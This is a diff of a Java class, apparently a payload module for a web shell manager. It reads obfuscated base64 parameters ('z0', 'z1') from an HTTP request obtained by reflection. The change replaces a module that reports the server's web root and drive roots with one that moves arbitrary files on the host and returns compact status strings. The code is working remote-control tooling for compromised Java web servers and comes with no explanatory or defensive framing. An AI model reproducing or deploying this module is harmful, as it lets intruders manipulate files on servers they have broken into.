@@ -1,14 +1,21 @@
-import java.io.*;
+import java.io.File;
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.AtomicMoveNotSupportedException;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
+import java.util.Base64;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
+import java.nio.file.*;
 
-public class file_init extends ClassLoader
+public class file_move extends ClassLoader
 {
-    public file_init(ClassLoader objParent) { super(objParent); }
-    public file_init() { super(file_init.class.getClassLoader()); }
+    public file_move(ClassLoader objParent) { super(objParent); }
+    public file_move() { super(file_move.class.getClassLoader()); }
 
     private Map<String, String> fnParseParams(String szParamStr)
     {
@@ -96,7 +103,7 @@ public class file_init extends ClassLoader
         Object objRequest = null;
         Object objResponse = null;
         OutputStream osClient = null;
-        
+
         try
         {
             Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
@@ -126,92 +133,44 @@ public class file_init extends ClassLoader
 
             Map<String, String> mapParams = fnParseParams(szParam);
             String szSplitter = mapParams.get("splitter");
-            
-            String szCurrentDir = "";
-            try
+            StringBuffer sb = new StringBuffer();
+
+            String szSrcPath = new String(Base64.getDecoder().decode(mapParams.get("z0")), StandardCharsets.UTF_8);
+            String szDstPath = new String(Base64.getDecoder().decode(mapParams.get("z1")), StandardCharsets.UTF_8);
+
+            File srcFile = new File(szSrcPath);
+            File dstFile = new File(szDstPath);
+
+            if (dstFile.exists())
             {
-                Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-
-                Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                Method fnGetServletPath = objRequest.getClass().getMethod("getServletPath", new Class[0]);
-                String szServletPath = (String) fnGetServletPath.invoke(objRequest, new Object[0]);
-
-                szRootPath = szRootPath.replace("\\", "/");
-                szServletPath = szServletPath.replace("\\", "/");
-                
-                if (!szRootPath.endsWith("/"))
-                    szRootPath += "/";
-                if (szServletPath.startsWith("/"))
-                    szServletPath = szServletPath.substring(1);
-                
-                String szFullPath = szRootPath + szServletPath;
-
-                szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-
+                sb.append("0|Destination already exists.");
             }
-            catch (Exception e)
+            else if (!srcFile.exists())
             {
-                try
-                {
-                    Method fnGetServletContext = objRequest.getClass().getMethod("getServletContext", new Class[0]);
-                    Object objServletContext = fnGetServletContext.invoke(objRequest, new Object[0]);
-                    Method fnGetRealPath = objServletContext.getClass().getMethod("getRealPath", new Class[]{String.class});
-                    String szRootPath = (String) fnGetRealPath.invoke(objServletContext, new Object[]{"/"});
-
-                    Method fnGetRequestURI = objRequest.getClass().getMethod("getRequestURI", new Class[0]);
-                    String szURI = (String) fnGetRequestURI.invoke(objRequest, new Object[0]);
-
-                    String szFullPath = szRootPath.replace("\\", "/") + szURI.replace("\\", "/");
-                    szCurrentDir = szFullPath.substring(0, szFullPath.lastIndexOf("/") + 1);
-                    szCurrentDir = szCurrentDir.replace("/", java.io.File.separator);
-                }
-                catch (Exception ex)
-                {
-                    szCurrentDir = System.getProperty("user.dir");
-                }
-            }
-
-            if (szCurrentDir.length() > 1 && szCurrentDir.endsWith(java.io.File.separator)) {
-                szCurrentDir = szCurrentDir.substring(0, szCurrentDir.length() - 1);
-            }
-
-            boolean bIsWindows = System.getProperty("os.name").toLowerCase().contains("win");
-
-            StringBuilder sb = new StringBuilder();
-            
-            sb.append(szCurrentDir);
-            sb.append("|");
-            if (!bIsWindows)
-            {
-                // Unix-like
-                sb.append("/");
+                sb.append("0|Source does not exist.");
             }
             else
             {
-                File[] roots = File.listRoots();
-                if (roots != null)
+                try
                 {
-                    List<String> lsDrive = new ArrayList<>();
-                    for (File root : roots)
-                    {
-                        String szPath = root.getAbsolutePath();
-                        if (szPath.endsWith(("\\")))
-                            szPath = szPath.substring(0, szPath.length() - 1);
+                    Path srcPath = srcFile.toPath();
+                    Path dstPath = dstFile.toPath();
 
-                        lsDrive.add(szPath);
+                    try {
+                        Files.move(srcPath, dstPath, StandardCopyOption.ATOMIC_MOVE);
+                    } catch (AtomicMoveNotSupportedException e) {
+                        Files.move(srcPath, dstPath);
                     }
 
-                    sb.append(String.join(",", lsDrive));
+                    sb.append("1|");
+                }
+                catch (Exception ex)
+                {
+                    sb.append("0|ERROR://" + ex.getMessage());
                 }
             }
 
-            String szOutput = sb.toString();
-
-            fnWriteOutput(objParam, objResponse, osClient, szOutput.getBytes());
+            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
         }
         catch (Exception ex)
         {
